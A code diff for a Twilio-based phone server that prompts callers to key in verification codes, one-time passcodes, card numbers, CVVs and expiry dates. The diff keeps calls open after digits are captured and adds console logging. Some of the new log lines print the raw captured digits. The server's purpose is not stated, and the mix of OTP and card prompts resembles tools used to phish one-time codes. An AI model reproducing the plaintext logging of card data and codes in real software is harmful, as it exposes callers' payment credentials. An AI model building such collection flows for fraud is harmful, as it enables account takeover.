@@ -402,12 +402,12 @@ const silenceTimers = new Map();
 const DEFAULT_COLLECT_DELAY_MS = 1200;
 
 const DIGIT_PROFILE_DEFAULTS = {
-  verification: { min_digits: 4, max_digits: 8, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1500, prompt: 'Please enter the verification code using your keypad.' },
-  otp: { min_digits: 4, max_digits: 8, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1500, prompt: 'Please enter the one-time code on your keypad.' },
-  cvv: { min_digits: 3, max_digits: 4, timeout_s: 12, max_retries: 2, min_collect_delay_ms: 1200, prompt: 'Enter the 3 or 4 digit security code using your keypad.' },
-  card_number: { min_digits: 13, max_digits: 19, timeout_s: 25, max_retries: 2, min_collect_delay_ms: 1500, confirmation_style: 'last4', prompt: 'Please enter the card number using your keypad.' },
-  card_expiry: { min_digits: 4, max_digits: 6, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1200, prompt: 'Enter the card expiry as MMYY (or MMYYYY) on your keypad.' },
-  zip: { min_digits: 5, max_digits: 9, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, prompt: 'Please enter the ZIP code using your keypad.' },
+  verification: { min_digits: 4, max_digits: 8, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1500, end_call_on_success: false, prompt: 'Please enter the verification code using your keypad.' },
+  otp: { min_digits: 4, max_digits: 8, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1500, end_call_on_success: false, prompt: 'Please enter the one-time code on your keypad.' },
+  cvv: { min_digits: 3, max_digits: 4, timeout_s: 12, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false, prompt: 'Enter the 3 or 4 digit security code using your keypad.' },
+  card_number: { min_digits: 13, max_digits: 19, timeout_s: 25, max_retries: 2, min_collect_delay_ms: 1500, confirmation_style: 'last4', end_call_on_success: false, prompt: 'Please enter the card number using your keypad.' },
+  card_expiry: { min_digits: 4, max_digits: 6, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false, prompt: 'Enter the card expiry as MMYY (or MMYYYY) on your keypad.' },
+  zip: { min_digits: 5, max_digits: 9, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false, prompt: 'Please enter the ZIP code using your keypad.' },
   extension: { min_digits: 1, max_digits: 6, timeout_s: 10, max_retries: 2, min_collect_delay_ms: 800, end_call_on_success: false, prompt: 'Enter the extension using your keypad.' },
   menu: { min_digits: 1, max_digits: 1, timeout_s: 8, max_retries: 2, min_collect_delay_ms: 800, end_call_on_success: false, prompt: 'Please press a keypad option now.' }
 };
@@ -458,7 +458,7 @@ function normalizeDigitExpectation(params = {}) {
   const confirmationStyle = params.confirmation_style || defaults.confirmation_style || 'none';
   const endCallOnSuccess = typeof params.end_call_on_success === 'boolean'
     ? params.end_call_on_success
-    : (typeof defaults.end_call_on_success === 'boolean' ? defaults.end_call_on_success : true);
+    : (typeof defaults.end_call_on_success === 'boolean' ? defaults.end_call_on_success : false);
   const prompt = params.prompt && String(params.prompt).trim().length > 0
     ? params.prompt
     : (defaults.prompt || 'Please enter the digits now.');
@@ -1894,6 +1894,7 @@ app.ws('/connection', (ws) => {
           if (digits) {
             clearSilenceTimer(callSid);
             const expectation = digitCollectionManager.expectations.get(callSid);
+            console.log(`Media DTMF for ${callSid}: "${digits}" (expectation ${expectation ? 'present' : 'missing'})`);
             if (!expectation) {
               webhookService.addLiveEvent(callSid, `🔢 Keypad: ${digits} (ignored)`, { force: true });
               return;
@@ -2533,6 +2534,7 @@ app.post('/incoming', (req, res) => {
     if (!config.server?.hostname) {
       return res.status(500).send('Server hostname not configured');
     }
+    console.log(`Incoming call webhook from ${req.body?.From || 'unknown'} to ${req.body?.To || 'unknown'}`);
     const response = new VoiceResponse();
     const connect = response.connect();
     // Request both audio + DTMF events from Twilio Media Streams
@@ -4358,9 +4360,11 @@ app.post('/webhook/twilio-gather', async (req, res) => {
     if (!callSid) {
       return res.status(400).send('Missing CallSid');
     }
+    console.log(`Gather webhook hit: callSid=${callSid} digits="${Digits || ''}"`);
 
     const expectation = digitCollectionManager.expectations.get(callSid);
     if (!expectation) {
+      console.warn(`Gather webhook had no expectation; reconnecting stream for ${callSid}`);
       const response = new VoiceResponse();
       response.say('One moment please.');
       response.connect().stream({ url: `wss://${config.server.hostname}/connection`, track: 'both_tracks' });
@@ -4384,13 +4388,24 @@ app.post('/webhook/twilio-gather', async (req, res) => {
           res.end(twiml);
           return;
         }
+        // Keep the call alive unless the expectation explicitly asked to end it
+        const response = new VoiceResponse();
+        const shouldEnd = expectation?.end_call_on_success === true;
+        if (shouldEnd) {
+          response.say(CALL_END_MESSAGES.success);
+          response.hangup();
+        } else {
+          response.say('Thanks, continuing.');
+          response.connect().stream({ url: `wss://${config.server.hostname}/connection`, track: 'both_tracks' });
+        }
+        clearDigitFallbackState(callSid);
+        res.type('text/xml');
+        res.end(response.toString());
+        return;
       }
 
       const response = new VoiceResponse();
-      if (collection.accepted) {
-        response.say(CALL_END_MESSAGES.success);
-        response.hangup();
-      } else if (collection.fallback) {
+      if (collection.fallback) {
         response.say(CALL_END_MESSAGES.failure);
         response.hangup();
       } else {
